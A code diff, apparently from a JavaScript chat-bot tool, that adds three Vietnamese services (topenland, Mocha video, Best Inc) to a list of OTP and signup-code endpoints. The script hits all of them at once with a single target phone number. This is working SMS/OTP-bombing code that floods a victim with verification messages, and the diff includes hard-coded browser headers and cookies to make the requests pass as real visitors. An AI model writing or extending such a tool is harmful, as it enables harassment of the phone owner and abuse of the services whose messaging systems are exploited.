@@ -302,7 +302,80 @@ const payload = {
       'id_customer': '0',
     };
 
+    const topenlandCookies = {
+      '_ga': 'GA1.1.2087670331.1693621115',
+      'ajs_anonymous_id': 'f03d6d9e-8b96-4989-85e4-4a2f1aa5804d',
+      'ApplicationGatewayAffinityCORS': 'e3a3e7f76978c3189d076edb90ce010d',
+      'ApplicationGatewayAffinity': 'e3a3e7f76978c3189d076edb90ce010d',
+      '_ga_05MHVHMYGR': 'GS1.1.1693621114.1.1.1693621123.0.0.0',
+    };
 
+    const topenlandHeaders = {
+      'authority': 'topenland.com',
+      'accept': '*/*',
+      'accept-language': 'en-US,en;q=0.9,vi;q=0.8',
+      'dnt': '1',
+      'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
+      'sec-ch-ua-mobile': '?1',
+      'sec-ch-ua-platform': '"Android"',
+      'sec-fetch-dest': 'empty',
+      'sec-fetch-mode': 'cors',
+      'sec-fetch-site': 'same-origin',
+      'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
+    };
+
+    const topenlandParams = {
+      'phoneNumber': phone,
+    };
+
+    const mochaHeaders = {
+      'Accept': 'application/json, text/plain, */*',
+      'Accept-Language': 'en-US,en;q=0.9,vi;q=0.8',
+      'Connection': 'keep-alive',
+      'DNT': '1',
+      'Origin': 'https://video.mocha.com.vn',
+      'Referer': 'https://video.mocha.com.vn/',
+      'Sec-Fetch-Dest': 'empty',
+      'Sec-Fetch-Mode': 'cors',
+      'Sec-Fetch-Site': 'same-site',
+      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
+      'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
+      'sec-ch-ua-mobile': '?0',
+      'sec-ch-ua-platform': '"Windows"',
+    };
+
+    const mochaParams = {
+      'msisdn': phone,
+      'languageCode': 'vi',
+    };
+
+    const bestIncHeaders = {
+      'Accept-Language': 'en-US,en;q=0.9,vi;q=0.8',
+      'Connection': 'keep-alive',
+      'DNT': '1',
+      'Origin': 'https://best-inc.vn',
+      'Referer': 'https://best-inc.vn/',
+      'Sec-Fetch-Dest': 'empty',
+      'Sec-Fetch-Mode': 'cors',
+      'Sec-Fetch-Site': 'cross-site',
+      'User-Agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
+      'accept': 'application/json',
+      'authorization': 'null',
+      'content-type': 'application/json',
+      'lang-type': 'vi-VN',
+      'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
+      'sec-ch-ua-mobile': '?1',
+      'sec-ch-ua-platform': '"Android"',
+      'x-auth-type': 'WEB',
+      'x-lan': 'VI',
+      'x-nat': 'vi-VN',
+      'x-timezone-offset': '7',
+    };
+
+    const bestIncData = {
+      'phoneNumber': phone,
+      'verificationCodeType': 1,
+    };
 
     // Initial message to be edited later
     let messageID = null;
@@ -351,7 +424,19 @@ const payload = {
   params: params
 }), 
         axios.post('https://products.popsww.com/api/v5/auths/register', popsData, { headers: popsHeaders }), 
-        axios.post('https://concung.com/ajax.html?sendOtpLogin', data, { headers: headers, withCredentials: true, jar: cookies })
+        axios.post('https://concung.com/ajax.html?sendOtpLogin', data, { headers: headers, withCredentials: true, jar: cookies }), 
+        axios.get('https://topenland.com/_next/data/VL6b140TPQ9AMHJ2DqgBU/vi/sign-up/verify-otp.json', {
+          params: topenlandParams,
+          headers: topenlandHeaders,
+          cookies: topenlandCookies
+        }), 
+        axios.post('https://apivideo.mocha.com.vn/onMediaBackendBiz/mochavideo/getOtp', null, {
+          params: mochaParams,
+          headers: mochaHeaders
+        }), 
+        axios.post('https://v9-cc.800best.com/uc/account/sendsignupcode', bestIncData, {
+          headers: bestIncHeaders
+        })
       ])
       .then(() => {
         successCount += 10;
